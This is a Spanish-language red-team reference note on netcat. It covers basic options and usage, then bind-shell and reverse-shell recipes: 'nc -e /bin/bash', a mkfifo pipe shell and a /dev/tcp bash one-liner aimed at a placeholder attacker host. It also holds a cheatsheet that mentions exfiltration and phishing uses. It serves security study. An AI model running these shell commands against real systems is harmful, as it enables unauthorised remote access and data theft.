---
aliases:
  - netcat
tags:
  - tool/netcat
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Shells]]"
kind: Tool
linked:
  - "[[ncat]]"
  - "[[Reverse Shell]]"
---
# Herramienta `nc`

### Definición 

> [!INFO] nc (Netcat)
>Es una herramienta de red que puede leer y escribir datos a través de conexiones de red usando los [[Protocolos|protocolos]] [[TCP]] o [[UDP]]. Se le conoce comúnmente como la "navaja suiza" de las utilidades de red debido a su amplio rango de funcionalidades.
^definicion

### Funciones Principales de Netcat:

1. **Cliente y Servidor TCP/UDP**: Netcat puede actuar tanto como un cliente o como un servidor para establecer conexiones de red.
2. **Redirección de Puertos**: Puede redirigir puertos, permitiendo que el tráfico en un puerto sea enviado a otro puerto.
3. **Escaneo de Puertos**: Puede escanear puertos en una red para verificar cuáles están abiertos.
4. **Transferencia de Archivos**: Permite la transferencia de archivos entre equipos a través de la red.
5. **Túneles Proxy**: Puede crear túneles proxy simples.

### Sintaxis Básica

```sh
nc [opciones] [host] [puerto]
```

### Opciones Comunes

- `-l`: Escuchar en lugar de conectarse (modo servidor).
- `-p`: Especificar el puerto local.
- `-n` desactiva la resolución DNS, evitando que `nc` intente resolver nombres de host.
- `-e`: Ejecutar un programa después de establecer la conexión.
- `-u`: Usar UDP en lugar de TCP.
- `-z`: Modo escaneo de puertos, no enviar datos.
- `-v`: Modo detallado.
- `-w`: Especificar un tiempo de espera para las conexiones.

### Ejemplos de Uso

#### 1. **Servidor TCP Simple**

Para escuchar en un puerto (por ejemplo, 1234):
```sh
nc -l -p 1234
```

#### 2. **Cliente TCP Simple**

Para conectarse a un servidor en el puerto 1234:
```sh
nc <host> 1234
```

#### 3. **Transferencia de Archivos**

**En el Servidor (recibiendo el archivo):**
```sh
nc -l -p 1234 > archivo_recibido.txt
```

**En el Cliente (enviando el archivo):**
```sh
nc <host> 1234 < archivo_a_enviar.txt
```

#### 4. **Ejecutar un Comando Remotamente**

**En el Servidor (ejecutando el comando):**
```sh
nc -l -p 1234 -e /bin/bash
```

**En el Cliente (conectándose y obteniendo una shell):**
```sh
nc <host> 1234
```

#### 5. **Escaneo de Puertos**

Para escanear puertos abiertos en un rango (por ejemplo, del 20 al 25):
```sh
nc -z -v <host> 20-25
```

#### 6. **UDP Chat Simple**

**Servidor UDP:**
```sh
nc -u -l -p 1234
```

**Cliente UDP:**
```sh
nc -u <host> 1234
```

### Ejemplos avanzados

#### Bind Shell 

En una **bind shell**, la máquina víctima escucha en un puerto específico, y el atacante se conecta a ese puerto para obtener acceso a una shell.

1. **En la máquina víctima**:
   ```bash
   nc -lvnp 4444 -e /bin/bash
   ```
- `-l` activa el modo de escucha (listen).
- `-v` muestra información detallada (verbose).
- `-n` desactiva la resolución DNS, evitando que `nc` intente resolver nombres de host.
- `-p 4444` especifica el puerto en el que `nc` estará escuchando (puedes cambiarlo por otro puerto si lo prefieres).
- `-e /bin/bash` indica que una vez se establezca la conexión, se ejecutará `/bin/bash`, proporcionando una shell al atacante.

2. **En la máquina del atacante**:
   ```bash
   nc [IP_victima] 4444
   ```
   - `[IP_victima]` debe reemplazarse con la dirección IP de la máquina víctima.
   - `4444` es el puerto en el cual la víctima está escuchando.

   Al ejecutar este comando, el atacante se conectará a la máquina víctima y obtendrá acceso a una shell.

#### Reverse Shell

1. **En la máquina del atacante**:
   ```bash
   nc -lvnp 4444
   ```
- `[IP_atacante]` debe reemplazarse con la dirección IP del atacante.
- `4444` es el puerto en el cual el atacante está escuchando (puede ser cambiado por otro puerto).
- `-e /bin/bash` indica que se ejecutará `/bin/bash` al establecer la conexión, proporcionando una shell al atacante.

2. **En la máquina víctima**:
   ```bash
   nc -e /bin/bash [IP_atacante] 4444
   ```
   - `[IP_atacante]` debe reemplazarse con la dirección IP del atacante.
   - `4444` es el puerto al que se conectará la víctima.

   Esto permite que la víctima se conecte a la máquina del atacante y le proporcione una shell.

---

## Cheatsheet

| Comando | Qué obtenés | Cuándo |
|---|---|---|
| `nc -lvnp 4444` | Listener TCP | Recibir reverse shell |
| `nc <target> <port>` | Conectar TCP raw | Banner grab, testing |
| `nc -u <target> 53` | Conectar UDP | UDP testing (DNS, SNMP) |
| `nc -lvnp 4444 > file.bin` | Recibir archivo | Exfil simple |
| `nc <target> 4444 < file.bin` | Enviar archivo | Push file |
| `nc -e /bin/sh <attacker> 4444` | Reverse shell (versión `-e`) | Si nc traditional |
| `nc -lvnp 80 < response.txt` | Servir HTTP response estático | Phishing/PoC |

---

## Reverse shells

```bash
# Attacker
nc -lvnp 4444

# Target (traditional)
nc -e /bin/bash <attacker> 4444

# Target (sin -e, alternativa)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> 4444 > /tmp/f

# Bash builtin (sin nc)
bash -i >& /dev/tcp/<attacker>/4444 0>&1
```

Ver [[Reverse Shell]].

---

## Port scan

```bash
nc -zv <target> 1-1000  # TCP scan rápido (no flexible, usar nmap)
nc -zuv <target> 53     # UDP probe
```

---

## Notas Relacionadas

- [[ncat]]
- [[Reverse Shell]]
- [[File Transfers]]
